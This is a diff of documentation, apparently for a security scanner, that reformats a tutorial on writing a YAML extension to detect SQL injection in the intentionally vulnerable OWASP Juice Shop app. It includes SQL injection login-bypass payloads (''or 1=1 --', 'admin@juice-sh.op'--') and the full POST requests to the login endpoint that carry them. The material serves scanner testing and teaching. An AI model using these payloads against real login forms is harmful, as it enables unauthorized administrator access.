@@ -27,10 +27,10 @@ Create a file that describes the extension (e.g., `non-mod-extension.yaml`) and 
 1.  [**The `meta-info` section**][link-meta-info].
 
     Prepare the description of the vulnerability that the extension will try to detect.
-    *   vulnerability header: `OWASP Juice Shop SQLi (non-mod extension)`
-    *   vulnerability description: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
-    *   vulnerability type: SQL injection
-    *   vulnerability threat level: high
+    * vulnerability header: `OWASP Juice Shop SQLi (non-mod extension)`
+    * vulnerability description: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
+    * vulnerability type: SQL injection
+    * vulnerability threat level: high
 <br><br>
     
     The corresponding `meta-info` section should look as follows:
@@ -46,12 +46,12 @@ Create a file that describes the extension (e.g., `non-mod-extension.yaml`) and 
 2.  **The `send` section, the [Send phase][doc-send-phase]**
 
     There are two payloads that should be sent as an `email` parameter value alongside any `password` value in order to exploit the SQL injection vulnerability in the target application:
-    *   `'or 1=1 --`
-    *   `admin@juice-sh.op'--`
+    * `'or 1=1 --`
+    * `admin@juice-sh.op'--`
     
     You can craft two test requests, each containing
-    *   the `email` parameter with one of the values described above and 
-    *   the `password` parameter with an arbitrary value.
+    * the `email` parameter with one of the values described above and 
+    * the `password` parameter with an arbitrary value.
 
     It is sufficient to use just one of these requests to test our example target application (OWASP Juice Shop).
     
@@ -99,7 +99,7 @@ Create a file that describes the extension (e.g., `non-mod-extension.yaml`) and 
      3.  **The `detect` section, the [Detect phase][doc-detect-phase]**.
     
     The following conditions indicate that the user authentication with administrator's rights was successful:
-    *   The presence of the shopping cart identifier parameter with the `1` value in the response body. The parameter is in JSON format and should look like this:
+    * The presence of the shopping cart identifier parameter with the `1` value in the response body. The parameter is in JSON format and should look like this:
     
         ```
         "bid":1
@@ -127,33 +127,31 @@ Create a file that describes the extension (e.g., `non-mod-extension.yaml`) and 
 
 Now the `non-mod-extension.yaml` file contains a complete set of the sections required for the extension to operate. The list of the file's contents is shown below:
 
-{% collapse title="non-mod-extension.yaml" %}
-```
-meta-info:
-  - type: sqli
-  - threat: 80
-  - title: 'OWASP Juice Shop SQLi (non-mod extension)'
-  - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
+??? info "non-mod-extension.yaml"
+    ```
+    meta-info:
+      - type: sqli
+      - threat: 80
+      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
+      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
 
-send:
-  - method: 'POST'
-    url: '/rest/user/login'
-    headers:
-    - 'Content-Type': 'application/json'
-    body: '{"email":"''or 1=1 --","password":"12345"}'
-  - method: 'POST'
-    url: '/rest/user/login'
-    headers:
-    - 'Content-Type': 'application/json'
-    body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
+    send:
+      - method: 'POST'
+        url: '/rest/user/login'
+        headers:
+        - 'Content-Type': 'application/json'
+        body: '{"email":"''or 1=1 --","password":"12345"}'
+      - method: 'POST'
+        url: '/rest/user/login'
+        headers:
+        - 'Content-Type': 'application/json'
+        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
 
-detect:
-  - response:
-    - body: "\"umail\":\"admin@juice-sh.op\""
-    - body: "\"bid\":1"
-```
-{% endcollapse %}
-
+    detect:
+      - response:
+        - body: "\"umail\":\"admin@juice-sh.op\""
+        - body: "\"bid\":1"
+    ```
 
 ##  Using the Extension
 
